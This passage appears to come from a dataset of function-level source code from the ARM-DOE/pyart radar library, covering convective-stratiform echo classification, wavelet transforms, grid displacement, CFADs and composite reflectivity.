        elif (ze_bkg >= 40.0) & (ze_bkg < 45.0):
            conv_rad = 4000.0
        else:
            conv_rad = 5000.0
    if area_relation == 1:
        if ze_bkg < 25:
            conv_rad = 1000.0
        elif (ze_bkg >= 25) & (ze_bkg < 30.0):
            conv_rad = 2000.0
        elif (ze_bkg >= 30.0) & (ze_bkg < 35.0):
            conv_rad = 3000.0
        elif (ze_bkg >= 35.0) & (ze_bkg < 40.0):
            conv_rad = 4000.0
        else:
            conv_rad = 5000.0
    if area_relation == 2:
        if ze_bkg < 20:
            conv_rad = 1000.0
        elif (ze_bkg >= 20) & (ze_bkg < 25.0):
            conv_rad = 2000.0
        elif (ze_bkg >= 25.0) & (ze_bkg < 30.0):
            conv_rad = 3000.0
        elif (ze_bkg >= 30.0) & (ze_bkg < 35.0):
            conv_rad = 4000.0
        else:
            conv_rad = 5000.0
    if area_relation == 3:
        if ze_bkg < 40:
            conv_rad = 0.0
        elif (ze_bkg >= 40) & (ze_bkg < 45.0):
            conv_rad = 1000.0
        elif (ze_bkg >= 45.0) & (ze_bkg < 50.0):
            conv_rad = 2000.0
        elif (ze_bkg >= 50.0) & (ze_bkg < 55.0):
            conv_rad = 6000.0
        else:
            conv_rad = 8000.0
    return conv_rad"
ARM-DOE/pyart,peakedness,"def peakedness(ze_bkg, peak_relation):
    """"""
        Given a background reflectivity value, we determine what the necessary
        peakedness (or difference) has to be between a grid point's
        reflectivity and the background reflectivity in order for that grid
        point to be labeled convective.
        """"""
    if peak_relation == 0:
        if ze_bkg < 0.0:
            peak = 10.0
        elif ze_bkg >= 0.0 and ze_bkg < 42.43:
            peak = 10.0 - ze_bkg ** 2 / 180.0
        else:
            peak = 0.0
    elif peak_relation == 1:
        if ze_bkg < 0.0:
            peak = 14.0
        elif ze_bkg >= 0.0 and ze_bkg < 42.43:
            peak = 14.0 - ze_bkg ** 2 / 180.0
        else:
            peak = 4.0
    return peak"
ARM-DOE/pyart,wavelet_reclass,"def wavelet_reclass(grid, refl_field, level, zr_a, zr_b, core_wt_threshold, conv_wt_threshold, scale_break, min_reflectivity, conv_min_refl, conv_core_threshold):
    """"""
    Compute ATWT described as Raut et al (2008) and classify radar echoes using scheme of Raut et al (2020).
    First, convert dBZ to rain rates using standard Z-R relationship or user given coefficients. This is to
    transform the normally distributed dBZ to gamma-like distribution, enhancing the structure of the field.

    Parameters
    ----------
    dbz_data : ndarray
        2D array containing radar data. Last dimension should be levels.
    res_km : float
        Resolution of the radar data in km
    scale_break : int
        Calculated scale break between convective and stratiform scales. Dyadically spaced in grid pixels.

    Returns
    -------
    wt_class : ndarray
        Precipitation type classification: 0. N/A 1. stratiform/non-convective,
        2. convective cores and 3. moderate+transitional (mix) convective
        regions.
    """"""
    try:
        dbz_data = grid.fields[refl_field]['data'][level, :, :]
    except:
        dbz_data = grid.fields[refl_field]['data'][:, :]
    radar_mask = np.ma.getmask(dbz_data)
    wt_sum = conv_wavelet_sum(dbz_data, zr_a, zr_b, scale_break)
    wt_class = label_classes(wt_sum, dbz_data, core_wt_threshold, conv_wt_threshold, min_reflectivity, conv_min_refl, conv_core_threshold)
    wt_class_ma = np.ma.masked_where(radar_mask, wt_class)
    wt_class_ma = wt_class_ma.squeeze()
    return wt_class_ma"
ARM-DOE/pyart,conv_wavelet_sum,"def conv_wavelet_sum(dbz_data, zr_a, zr_b, scale_break):
    """"""
    Computes the sum of wavelet transform components for convective scales from dBZ data.

    Parameters
    ------------
    dbz_data : ndarray
        2D array containing radar dBZ data.
    zr_a, zr_b : float
        Coefficients for the Z-R relationship.
    res_km : float
        Resolution of the radar data in km.
    scale_break : int
        Calculated scale break (in pixels) between convective and stratiform scales

    Returns
    ---------
    wt_sum : ndarray
        Sum of convective scale wavelet transform components.
    """"""
    try:
        dbz_data = dbz_data.filled(0)
    except Exception:
        pass
    dbz_data[np.isnan(dbz_data)] = 0
    rr_data = (10.0 ** (dbz_data / 10.0) / zr_a) ** (1.0 / zr_b)
    (wt, _) = atwt2d(rr_data, max_scale=scale_break)
    wt_sum = np.sum(wt, axis=0)
    return wt_sum"
ARM-DOE/pyart,label_classes,"def label_classes(wt_sum, dbz_data, core_wt_threshold, conv_wt_threshold, min_reflectivity, conv_min_refl, conv_core_threshold):
    """"""
    Labels classes using given thresholds:
        - 0: No precipitation or unclassified
        - 1: Stratiform/non-convective regions
        - 2: Transitional and mixed convective regions
        - 3: Convective cores

    Following hard coded values are optimized and validated using C-band radars
    over Darwin, Australia (2.5 km grid spacing) and tested for Solapur, India (1km grid spacing) [Raut et al. 2020].
    core_wt_threshold = 5  # WT value more than this is strong convection
    conv_wt_threshold = 2  # WT value for moderate convection
    min_reflectivity = 10  # pixels below this value are not classified.
     conv_min_refl = 30  # pixel below this value are not convective. This works for most cases.

    Parameters
    -----------
    wt_sum : ndarray
        Integrated wavelet transform
    vol_data : ndarray
        Array, vector or matrix of data

    Returns
    ---------
    wt_class : ndarray
        Precipitation type classification.
    """"""
    wt_class = np.where((wt_sum >= conv_wt_threshold) & (dbz_data >= conv_core_threshold), -3, 0)
    wt_class = np.where((wt_sum >= core_wt_threshold) & (dbz_data >= conv_min_refl), -3, 0)
    wt_class = np.where((wt_sum < core_wt_threshold) & (wt_sum >= conv_wt_threshold) & (dbz_data >= conv_min_refl), -2, wt_class)
    wt_class = np.where((wt_class == 0) & (dbz_data >= min_reflectivity), -1, wt_class)
    wt_class = -1 * wt_class
    wt_class = np.where(wt_class == 0, np.nan, wt_class)
    return wt_class.astype(np.int32)"
ARM-DOE/pyart,calc_scale_break,"def calc_scale_break(res_meters, conv_scale_km):
    """"""
    Compute scale break for convection and stratiform regions. WT will be
    computed upto this scale and features will be designated as convection.

    Parameters
    -----------
    res_meters : float
        resolution of the image.
    conv_scale_km : float
        expected size of spatial variations due to convection.

    Returns
    --------
    dyadic scale break : int
        integer scale break in dyadic scale.
    """"""
    res_km = res_meters / 1000
    scale_break = np.log(conv_scale_km / res_km) / np.log(2) + 1
    return int(round(scale_break))"
ARM-DOE/pyart,atwt2d,"def atwt2d(data2d, max_scale=-1):
    """"""
    Computes a trous wavelet transform (ATWT). Computes ATWT of the 2D array
    up to max_scale. If max_scale is outside the boundaries, number of scales
    will be reduced.

    Data is mirrored at the boundaries. 'Negative WT are removed. Not tested
    for non-square data.

    @authors: Bhupendra A. Raut and Dileep M. Puranik
    @references: Press et al. (1992) Numerical Recipes in C.

    Parameters
    -----------
    data2d : ndarray
        2D image as array or matrix.
    max_scale :
        Computes wavelets up to max_scale. Leave blank for maximum possible
        scales.

    Returns
    ---------
    tuple of ndarray
        ATWT of input image and the final smoothed image or background image.
    """"""
    if not isinstance(data2d, np.ndarray):
        raise TypeError('The input data2d must be a numpy array.')
    data2d = data2d.squeeze()
    dims = data2d.shape
    min_dims = np.min(dims)
    max_possible_scales = int(np.floor(np.log(min_dims) / np.log(2)))
    if max_scale < 0 or max_possible_scales <= max_scale:
        max_scale = max_possible_scales - 1
    ny = dims[0]
    nx = dims[1]
    wt = np.zeros((max_scale, ny, nx))
    temp1 = np.zeros(dims)
    temp2 = np.zeros(dims)
    sf = (0.0625, 0.25, 0.375)
    for scale in range(1, max_scale + 1):
        x1 = 2 ** (scale - 1)
        x2 = 2 * x1
        for i in range(0, nx):
            prev2 = abs(i - x2)
            prev1 = abs(i - x1)
            next1 = i + x1
            next2 = i + x2
            if next1 > nx - 1:
                next1 = 2 * (nx - 1) - next1
            if next2 > nx - 1:
                next2 = 2 * (nx - 1) - next2
            if prev1 < 0 or prev2 < 0:
                prev1 = next1
                prev2 = next2
            for j in range(0, ny):
                left2 = data2d[j, prev2]
                left1 = data2d[j, prev1]
                right1 = data2d[j, next1]
                right2 = data2d[j, next2]
                temp1[j, i] = sf[0] * (left2 + right2) + sf[1] * (left1 + right1) + sf[2] * data2d[j, i]
        for i in range(0, ny):
            prev2 = abs(i - x2)
            prev1 = abs(i - x1)
            next1 = i + x1
            next2 = i + x2
            if next1 > ny - 1:
                next1 = 2 * (ny - 1) - next1
            if next2 > ny - 1:
                next2 = 2 * (ny - 1) - next2
            if prev1 < 0 or prev2 < 0:
                prev1 = next1
                prev2 = next2
            for j in range(0, nx):
                top2 = temp1[prev2, j]
                top1 = temp1[prev1, j]
                bottom1 = temp1[next1, j]
                bottom2 = temp1[next2, j]
                temp2[i, j] = sf[0] * (top2 + bottom2) + sf[1] * (top1 + bottom1) + sf[2] * temp1[i, j]
        wt[scale - 1, :, :] = data2d - temp2
        data2d[:] = temp2
    return (wt, data2d)"
ARM-DOE/pyart,grid_displacement_pc,"def grid_displacement_pc(grid1, grid2, field, level, return_value='pixels'):
    """"""
    Calculate the grid displacement using phase correlation.

    See:
    http://en.wikipedia.org/wiki/Phase_correlation

    Implementation inspired by Christoph Gohlke:
    http://www.lfd.uci.edu/~gohlke/code/imreg.py.html

    Note that the grid must have the same dimensions in x and y and assumed to
    have constant spacing in these dimensions.

    Parameters
    ----------
    grid1, grid2 : Grid
        Py-ART Grid objects separated in time and square in x/y.
    field : string
        Field to calculate advection from. Field must be in both grid1
        and grid2.
    level : integer
        The vertical (z) level of the grid to use in the calculation.
    return_value : str, optional
        'pixels', 'distance' or 'velocity'. Distance in pixels (default)
        or meters or velocity vector in m/s.

    Returns
    -------
    displacement : two-tuple
         Calculated displacement in units of y and x. Value returned in
         integers if pixels, otherwise floats.

    """"""
    field_data1 = grid1.fields[field]['data'][level].copy()
    field_data2 = grid2.fields[field]['data'][level].copy()
    if 'valid_min' in grid1.fields[field]:
        min_value1 = grid1.fields[field]['valid_min']
    else:
        min_value1 = field_data1.min()
    field_data1 = np.ma.filled(field_data1, min_value1)
    if 'valid_min' in grid2.fields[field]:
        min_value2 = grid2.fields[field]['valid_min']
    else:
        min_value2 = field_data2.min()
    field_data2 = np.ma.filled(field_data2, min_value2)
    image1fft = np.fft.fft2(field_data1)
    image2fft = np.conjugate(np.fft.fft2(field_data2))
    imageccor = np.real(np.fft.ifft2(image1fft * image2fft))
    imageccorshift = np.fft.fftshift(imageccor)
    (row, col) = field_data1.shape
    (yshift, xshift) = np.unravel_index(np.argmax(imageccorshift), (row, col))
    yshift -= int(row / 2)
    xshift -= int(col / 2)
    dx = grid1.x['data'][1] - grid1.x['data'][0]
    dy = grid1.y['data'][1] - grid1.y['data'][0]
    x_movement = xshift * dx
    y_movement = yshift * dy
    if return_value == 'pixels':
        displacement = (yshift, xshift)
    elif return_value == 'distance':
        displacement = (y_movement, x_movement)
    elif return_value == 'velocity':
        t1 = num2date(grid1.time['data'][0], grid1.time['units'])
        t2 = num2date(grid2.time['data'][0], grid2.time['units'])
        dt = (t2 - t1).total_seconds()
        u = x_movement / dt
        v = y_movement / dt
        displacement = (v, u)
    else:
        displacement = (yshift, xshift)
    return displacement"
ARM-DOE/pyart,grid_shift,"def grid_shift(grid, advection, trim_edges=0, field_list=None):
    """"""
    Shift a grid by a certain number of pixels.

    Parameters
    ----------
    grid: Grid
        Py-ART Grid object.
    advection : two-tuple of floats
        Number of Pixels to shift the image by.
    trim_edges: integer, optional
        Edges to cut off the grid and axes, both x and y. Defaults to zero.
    field_list : list, optional
        List of fields to include in new grid. None, the default, includes all
        fields from the input grid.

    Returns
    -------
    shifted_grid : Grid
         Grid with fields shifted and, if requested, subset.

    """"""
    if trim_edges == 0:
        trim_slice = slice(None, None)
    else:
        trim_slice = slice(int(trim_edges), -int(trim_edges))
    shifted_grid = copy.deepcopy(grid)
    shifted_grid.x['data'] = grid.x['data'][trim_slice].copy()
    shifted_grid.y['data'] = grid.y['data'][trim_slice].copy()
    if field_list is None:
        field_list = grid.fields.keys()
    for field in field_list:
        data = grid.fields[field]['data'].copy()
        data = np.ma.filled(data, np.nan)
        shifted_data = shift(data, [0, advection[0], advection[1]], prefilter=False)
        shifted_data = np.ma.fix_invalid(shifted_data, copy=False, fill_value=get_fillvalue())
        shifted_data = shifted_data[:, trim_slice, trim_slice]
        shifted_grid.fields[field]['data'] = shifted_data
    return shifted_grid"
ARM-DOE/pyart,create_cfad,"def create_cfad(radar, field_bins, altitude_bins, field='reflectivity', field_mask=None, min_frac_thres=0.1):
    """"""
    This function returns a Contoured Frequency by Altitude Diagram (CFAD; Yuter et al. 1995), a 2-dimensional
    histogram that is normalized by the number of points at each altitude. Altitude bins are masked where the counts
    are less than a minimum fraction of the largest number of counts for any altitude row.

    radar : Radar
        Radar object used. Can be Radar or Grid object.
    field_bins : list
        List of bin edges for field values to use for CFAD creation.
    altitude_bins : list
        List of bin edges for height values to use for CFAD creation.
    field : str
        Field name to use to look up reflectivity data. In the
        radar object. Default field name is 'reflectivity'.
    field_mask : array
        An array the same size as the field array used to mask values.
    min_frac_thres : float, optional
        Fraction of values to remove in CFAD normalization (default 0.1). If an altitude row has a total count that
        is less than min_frac_thres of the largest number of total counts for any altitude row, the bins in that
        altitude row are masked.

    Returns
    -------
    freq_norm : array
        Array of normalized frequency.
    height_edges : array
        Array of bin edges for height data.
    field_edges : array of x coordinates
        Array of bin edges for field data.

    References
    ----------
    Yuter, S. E., and R. A. Houze, 1995: Three-Dimensional Kinematic and
    Microphysical Evolution of Florida Cumulonimbus. Part II: Frequency Distributions
    of Vertical Velocity, Reflectivity, and Differential Reflectivity. Mon. Wea. Rev.
    123, 1941-1963. https://doi.org/10.1175/1520-0493(1995)123%3C1941:TDKAME%3E2.0.CO;2


    """"""
    field_data = radar.fields[field]['data'][:]
    try:
        altitude_data = radar.gate_z['data']
    except:
        try:
            altitude_data = radar.point_z['data']
        except:
            print('No altitude data found')
            raise
    if field_mask is not None:
        field_data = np.ma.masked_where(field_mask, field_data)
        altitude_data = np.ma.masked_where(field_data.mask, altitude_data)
    (freq, height_edges, field_edges) = np.histogram2d(altitude_data.compressed(), field_data.compressed(), bins=[altitude_bins, field_bins])
    freq_sum = np.sum(freq, axis=1)
    point_thres = min_frac_thres * np.max(freq_sum)
    freq_sum_rep = np.repeat(freq_sum[..., np.newaxis], freq.shape[1], axis=1)
    freq_norm = freq / freq_sum_rep
    freq_norm = np.ma.masked_where(freq_sum_rep < point_thres, freq_norm)
    return (freq_norm, height_edges, field_edges)"
ARM-DOE/pyart,composite_reflectivity,"def composite_reflectivity(radar, field='reflectivity', gatefilter=None):
    """"""
    Composite Reflectivity

    Often a legacy product, composite reflectivity is:
    ""A display or mapping of the maximum radar reflectivity factor at any
    altitude as a function of position on the ground."" - AMS Glossary
    This is more useful for the dry regions of the world, where maximum
    reflectivity values are found aloft, as opposed to the lowest scan.
    Alternatively this is useful for comparing to NWP since composite Z
    is a standard output of NWP.

    Why this is not as easy as one would think: Turns out the data are
    not natively stored with index 0 being azimuth 0. Likely due to the
    physical spinning of the radar antenna.

    Author: Randy J. Chase (@dopplerchase)

    Parameters
    ----------
    radar : Radar
        Radar object used.
    field : str
        Reflectivity field name to use to look up reflectivity data. In the
        radar object. Default field name is 'reflectivity'.
    gatefilter : GateFilter
        GateFilter instance. None will result in no gatefilter mask being
        applied to data.

    Returns
    -------
    radar : Radar
        The radar object containing the radar dimensions, metadata and
        composite field.

    References
    ----------
    American Meteorological Society, 2022: ""Composite reflectivity"". Glossary of Meteorology,
    http://glossary.ametsoc.org/wiki/Composite_reflectivity

    """"""
    minimum_sweep = np.min(radar.sweep_number['data'])
    for sweep in sorted(radar.sweep_number['data']):
        sweep_slice = radar.get_slice(sweep)
        z = radar.get_field(sweep, field)
        z_dtype = z.dtype
        if gatefilter is not None:
            mask_sweep = gatefilter.gate_excluded[sweep_slice, :]
            z = np.ma.masked_array(z, mask_sweep)
        lon = radar.gate_longitude['data'][sweep_slice, :]
        lat = radar.gate_latitude['data'][sweep_slice, :]
        ranges = radar.range['data']
        time = radar.time['data']
        az = radar.azimuth['data'][sweep_slice]
        az_ids = np.argsort(az)
        az = az[az_ids]
        z = z[az_ids]
        lon = lon[az_ids]
        lat = lat[az_ids]
        time = time[az_ids]
        if sweep == minimum_sweep:
            azimuth_final = az
            time_final = time
            lon_0 = copy.deepcopy(lon)
            lon_0[-1, :] = lon_0[0, :]
            lat_0 = copy.deepcopy(lat)
            lat_0[-1, :] = lat_0[0, :]
        else:
            z_interpolator = interp2d(ranges, az, z, kind='linear')
            z = z_interpolator(ranges, azimuth_final)
        if sweep == minimum_sweep:
            z_stack = copy.deepcopy(z[np.newaxis, :, :])
        else:
            z_stack = np.concatenate([z_stack, z[np.newaxis, :, :]])
    compz = z_stack.max(axis=0).astype(z_dtype)
    try:
        dtime = to_datetime(num2date(radar.time['data'], radar.time['units']).astype(str), format='ISO8601')
    except ValueError:
        dtime = to_datetime(num2date(radar.time['data'], radar.time['units']).astype(str))
    dtime = dtime.mean()
    fields = {}
    fields['composite_reflectivity'] = {'data': compz, 'units': 'dBZ', 'long_name': 'composite_reflectivity', 'comment': 'composite reflectivity computed from calculating the max radar value in each radar gate vertically after reordering'}
    time = radar.time.copy()
    time['data'] = time_final
    time['mean'] = dtime
    gate_longitude = radar.gate_longitude.copy()
    gate_longitude['data'] = lon_0
    gate_longitude['comment'] = 'reordered longitude grid, [az,range]'
    gate_latitude = radar.gate_latitude.copy()
    gate_latitude['data'] = lat_0
    gate_latitude['comment'] = 'reordered latitude grid, [az,range]'
    _range = radar.range.copy()
    metadata = radar.metadata.copy()
    scan_type = radar.scan_type
    latitude = radar.latitude.copy()
    longitude = radar.longitude.copy()
    altitude = radar.altitude.copy()
    instrument_parameters = radar.instrument_parameters
    sweep_number = radar.sweep_number.copy()
    sweep_number['data'] = np.array([0], dtype='int32')
    sweep_mode = radar.sweep_mode.copy()
    sweep_mode['data'] = np.array([radar.sweep_mode['data'][0]])
    ray_shape = compz.shape[0]
    azimuth = radar.azimuth.copy()
    azimuth['data'] = azimuth_final
    elevation = radar.elevation.copy()
    elevation['data'] = np.zeros(ray_shape, dtype='float32')
    fixed_angle = radar.fixed_angle.copy()
    fixed_angle['data'] = np.array([0.0], dtype='float32')
    sweep_start_ray_index = radar.sweep_start_ray_index.copy()
    sweep_start_ray_index['data'] = np.array([0], dtype='int32')
    sweep_end_ray_index = radar.sweep_end_ray_index.copy()
    sweep_end_ray_index['data'] = np.array([ray_shape - 1], dtype='int32')
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,steiner_conv_strat,"def steiner_conv_strat(grid, dx=None, dy=None, intense=42.0, work_level=3000.0, peak_relation='default', area_relation='medium', bkg_rad=11000.0, use_intense=True, fill_value=None, refl_field=None):
    """"""
    Partition reflectivity into convective-stratiform using the Steiner et
    al. (1995) algorithm.

    Parameters
    ----------
    grid : Grid
        Grid containing reflectivity field to partition.
    dx, dy : float, optional
        The x- and y-dimension resolutions in meters, respectively. If None
        the resolution is determined from the first two axes values.
    intense : float, optional
        The intensity value in dBZ. Grid points with a reflectivity
        value greater or equal to the intensity are automatically
        flagged as convective. See reference for more information.
    work_level : float, optional
        The working level (separation altitude) in meters. This is the height
        at which the partitioning will be done, and should minimize bright band
        contamination. See reference for more information.
    peak_relation : 'default' or 'sgp', optional
        The peakedness relation. See reference for more information.
    area_relation : 'small', 'medium', 'large', or 'sgp', optional
        The convective area relation. See reference for more information.
    bkg_rad : float, optional
        The background radius in meters. See reference for more information.
    use_intense : bool, optional
        True to use the intensity criteria.
    fill_value : float, optional
         Missing value used to signify bad data points. A value of None
         will use the default fill value as defined in the Py-ART
         configuration file.
    refl_field : str, optional
         Field in grid to use as the reflectivity during partitioning. None
         will use the default reflectivity field name from the Py-ART
         configuration file.

    Returns
    -------
    eclass : dict
        Steiner convective-stratiform classification dictionary.

    References
    ----------
    Steiner, M. R., R. A. Houze Jr., and S. E. Yuter, 1995: Climatological
    Characterization of Three-Dimensional Storm Structure from Operational
    Radar and Rain Gauge Data. J. Appl. Meteor., 34, 1978-2007.

    """"""
    if fill_value is None:
        fill_value = get_fillvalue()
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if dx is None:
        dx = grid.x['data'][1] - grid.x['data'][0]
    if dy is None:
        dy = grid.y['data'][1] - grid.y['data'][0]
    x = grid.x['data']
    y = grid.y['data']
    z = grid.z['data']
    ze = np.ma.copy(grid.fields[refl_field]['data'])
    ze = ze.filled(np.NaN)
    eclass = steiner_class_buff(ze, x, y, z, dx=dx, dy=dy, bkg_rad=bkg_rad, work_level=work_level, intense=intense, peak_relation=peak_relation, area_relation=area_relation, use_intense=use_intense)
    return {'data': eclass.astype(np.int32), 'standard_name': 'echo_classification', 'long_name': 'Steiner echo classification', 'valid_min': 0, 'valid_max': 2, 'comment_1': 'Convective-stratiform echo classification based on Steiner et al. (1995)', 'comment_2': '0 = Undefined, 1 = Stratiform, 2 = Convective'}"
ARM-DOE/pyart,conv_strat_yuter,"def conv_strat_yuter(grid, dx=None, dy=None, level_m=None, always_core_thres=42, bkg_rad_km=11, use_cosine=True, max_diff=5, zero_diff_cos_val=55, scalar_diff=1.5, use_addition=True, calc_thres=0.75, weak_echo_thres=5.0, min_dBZ_used=5.0, dB_averaging=True, remove_small_objects=True, min_km2_size=10, val_for_max_conv_rad=30, max_conv_rad_km=5.0, cs_core=3, nosfcecho=0, weakecho=3, sf=1, conv=2, refl_field=None, estimate_flag=True, estimate_offset=5):
    """"""
    Partition reflectivity into convective-stratiform using the Yuter et al. (2005)
    and Yuter and Houze (1997) algorithm.

    Parameters
    ----------
    grid : Grid
        Grid containing reflectivity field to partition.
    dx, dy : float, optional
        The x- and y-dimension resolutions in meters, respectively. If None
        the resolution is determined from the first two axes values parsed from grid object.
    level_m : float, optional
        Desired height in meters to classify with convective stratiform algorithm.
    always_core_thres : float, optional
        Threshold for points that are always convective. All values above the threshold are classifed as convective
        See Yuter et al. (2005) for more detail.
    bkg_rad_km : float, optional
        Radius to compute background reflectivity in kilometers. Default is 11 km. Recommended to be at least 3 x
        grid spacing
    use_cosine : bool, optional
        Boolean used to determine if a cosine scheme (see Yuter and Houze (1997)) should be used for identifying
        convective cores (True) or if a simpler scalar scheme (False) should be used.
    max_diff : float, optional
        Maximum difference between background average and reflectivity in order to be classified as convective.
        ""a"" value in Eqn. B1 in Yuter and Houze (1997)
    zero_diff_cos_val : float, optional
        Value where difference between background average and reflectivity is zero in the cosine function
        ""b"" value in Eqn. B1 in Yuter and Houze (1997)
    scalar_diff : float, optional
        If using a scalar difference scheme, this value is the multiplier or addition to the background average
    use_addition : bool, optional
        Determines if a multiplier (False) or addition (True) in the scalar difference scheme should be used
    calc_thres : float, optional
        Minimum percentage of points needed to be considered in background average calculation
    weak_echo_thres : float, optional
        Threshold for determining weak echo. All values below this threshold will be considered weak echo
    min_dBZ_used : float, optional
        Minimum dBZ value used for classification. All values below this threshold will be considered no surface echo
        See Yuter and Houze (1997) and Yuter et al. (2005) for more detail.
    dB_averaging : bool, optional
        True if using dBZ reflectivity values that need to be converted to linear Z before averaging. False for
        other non-dBZ values (i.e. snow rate)
    remove_small_objects : bool, optional
        Determines if small objects should be removed from convective core array. Default is True.
    min_km2_size : float, optional
        Minimum size of convective cores to be considered. Cores less than this size will be removed. Default is 10
        km^2.
    val_for_max_conv_rad : float, optional
        dBZ for maximum convective radius. Convective cores with values above this will have the maximum convective
        radius
    max_conv_rad_km : float, optional
        Maximum radius around convective cores to classify as convective. Default is 5 km
    cs_core : int, optional
        Value for points classified as convective cores
    nosfcecho : int, optional
        Value for points classified as no surface echo, based on min_dBZ_used
    weakecho : int, optional
        Value for points classified as weak echo, based on weak_echo_thres
    sf : int, optional
        Value for points classified as stratiform
    conv : int, optional
        Value for points classified as convective
    refl_field : str, optional
        Field in grid to use as the reflectivity during partitioning. None will use the default reflectivity
        field name from the Py-ART configuration file.
    estimate_flag : bool, optional
        Determines if over/underestimation should be applied. If true, the algorithm will also be run on the same field
        wih the estimate_offset added and the same field with the estimate_offset subtracted.
        Default is True (recommended)
    estimate_offset : float, optional
        Value used to offset the reflectivity values by for the over/underestimation application. Default value is 5
        dBZ.

    Returns
    -------
    convsf_dict : dict
        Convective-stratiform classification dictionary.

    References
    ----------
    Yuter, S. E., and R. A. Houze, Jr., 1997: Measurements of raindrop size
    distributions over the Pacific warm pool and implications for Z-R relations.
    J. Appl. Meteor., 36, 847-867.
    https://doi.org/10.1175/1520-0450(1997)036%3C0847:MORSDO%3E2.0.CO;2

    Yuter, S. E., R. A. Houze, Jr., E. A. Smith, T. T. Wilheit, and E. Zipser,
    2005: Physical characterization of tropical oceanic convection observed in
    KWAJEX. J. Appl. Meteor., 44, 385-415. https://doi.org/10.1175/JAM2206.1

    """"""
    warn('This function will be deprecated in Py-ART 2.0. Please use feature_detection function.', DeprecationWarning)
    feature_dict = feature_detection(grid, dx=dx, dy=dy, level_m=level_m, always_core_thres=always_core_thres, bkg_rad_km=bkg_rad_km, use_cosine=use_cosine, max_diff=max_diff, zero_diff_cos_val=zero_diff_cos_val, scalar_diff=scalar_diff, use_addition=use_addition, calc_thres=calc_thres, weak_echo_thres=weak_echo_thres, min_val_used=min_dBZ_used, dB_averaging=dB_averaging, remove_small_objects=remove_small_objects, min_km2_size=min_km2_size, binary_close=False, val_for_max_rad=val_for_max_conv_rad, max_rad_km=max_conv_rad_km, core_val=cs_core, nosfcecho=nosfcecho, weakecho=weakecho, bkgd_val=sf, feat_val=conv, field=refl_field, estimate_flag=estimate_flag, estimate_offset=5, overest_field=None, underest_field=None)
    return feature_dict"
ARM-DOE/pyart,feature_detection,"def feature_detection(grid, dx=None, dy=None, level_m=None, always_core_thres=42, bkg_rad_km=11, use_cosine=True, max_diff=5, zero_diff_cos_val=55, scalar_diff=1.5, use_addition=True, calc_thres=0.75, weak_echo_thres=5.0, min_val_used=5.0, dB_averaging=True, remove_small_objects=True, min_km2_size=10, binary_close=False, val_for_max_rad=30, max_rad_km=5.0, core_val=3, nosfcecho=0, weakecho=3, bkgd_val=1, feat_val=2, field=None, estimate_flag=True, estimate_offset=5, overest_field=None, underest_field=None):
    """"""
    This function can be used to detect features in a field (e.g. reflectivity, rain rate, snow rate,
    etc.) described by Tomkins et al. (2023) and based on original convective-stratiform algorithms developed by
    Steiner et al. (1995), Yuter et al. (2005) and Yuter and Houze (1997) algorithm.

    Author: Laura Tomkins (@lauratomkins)

    Parameters
    ----------
    grid : Grid
        Grid containing reflectivity field to partition.
    dx, dy : float, optional
        The x- and y-dimension resolutions in meters, respectively. If None
        the resolution is determined from the first two axes values parsed from grid object.
    level_m : float, optional
        Desired height in meters to run feature detection algorithm.
    always_core_thres : float, optional
        Threshold for points that are always features. All values above the threshold are classified as features.
    bkg_rad_km : float, optional
        Radius to compute background reflectivity in kilometers. Default is 11 km. Recommended to be at least 3 x
        grid spacing
    use_cosine : bool, optional
        Boolean used to determine if a cosine scheme (see Yuter and Houze (1997)) should be used for identifying
        cores (True) or if a simpler scalar scheme (False) should be used.
    max_diff : float, optional
        Maximum difference between background average and reflectivity in order to be classified as features.
        ""a"" value in Eqn. B1 in Yuter and Houze (1997)
    zero_diff_cos_val : float, optional
        Value where difference between background average and reflectivity is zero in the cosine function
        ""b"" value in Eqn. B1 in Yuter and Houze (1997)
    scalar_diff : float, optional
        If using a scalar difference scheme, this value is the multiplier or addition to the background average
    use_addition : bool, optional
        Determines if a multiplier (False) or addition (True) in the scalar difference scheme should be used
    calc_thres : float, optional
        Minimum percentage of points needed to be considered in background average calculation
    weak_echo_thres : float, optional
        Threshold for determining weak echo. All values below this threshold will be considered weak echo
    min_val_used : float, optional
        Minimum value used for classification. All values below this threshold will be considered no surface echo
        See Yuter and Houze (1997) and Yuter et al. (2005) for more detail. Units based on input field
    dB_averaging : bool, optional
        True if using dBZ reflectivity values that need to be converted to linear Z before averaging. False for
        other non-dBZ values (i.e. snow rate)
    remove_small_objects : bool, optional
        Determines if small objects should be removed from core array. Default is True.
    min_km2_size : float, optional
        Minimum size of Cores to be considered. Cores less than this size will be removed. Default is 10 km^2.
    binary_close : bool, optional
        Determines if a binary closing should be performed on the cores. Default is False.
    val_for_max_rad : float, optional
        value used for maximum radius. Cores with values above this will have the maximum radius incorporated.
    max_rad_km : float, optional
        Maximum radius around cores to classify as feature. Default is 5 km
    core_val : int, optional
        Value for points classified as cores
    nosfcecho : int, optional
        Value for points classified as no surface echo, based on min_val_used
    weakecho : int, optional
        Value for points classified as weak echo, based on weak_echo_thres.
    bkgd_val : int, optional
        Value for points classified as background echo.
    feat_val : int, optional
        Value for points classified as features.
    field : str, optional
        Field in grid to find objects in. None will use the default reflectivity field name from the Py-ART
        configuration file.
    estimate_flag : bool, optional
        Determines if over/underestimation should be applied. If true, the algorithm will also be run on the same field
        wih the estimate_offset added and the same field with the estimate_offset subtracted.
        Default is True (recommended)
    estimate_offset : float, optional
        Value used to offset the field values by for the over/underestimation application. Default value is 5 dBZ.
    overest_field : str, optional
        Name of field in grid object used to calculate the overestimate if estimate_flag is True.
    underest_field : str, optional
        Name of field in grid object used to calculate the underestimate if estimate_flag is True.

    Returns
    -------
    feature_dict : dict
        Feature detection classification dictionary.

    References
    ----------
    Steiner, M. R., R. A. Houze Jr., and S. E. Yuter, 1995: Climatological
    Characterization of Three-Dimensional Storm Structure from Operational
    Radar and Rain Gauge Data. J. Appl. Meteor., 34, 1978-2007.

    Yuter, S. E., and R. A. Houze, Jr., 1997: Measurements of raindrop size
    distributions over the Pacific warm pool and implications for Z-R relations.
    J. Appl. Meteor., 36, 847-867.
    https://doi.org/10.1175/1520-0450(1997)036%3C0847:MORSDO%3E2.0.CO;2

    Yuter, S. E., R. A. Houze, Jr., E. A. Smith, T. T. Wilheit, and E. Zipser,
    2005: Physical characterization of tropical oceanic convection observed in
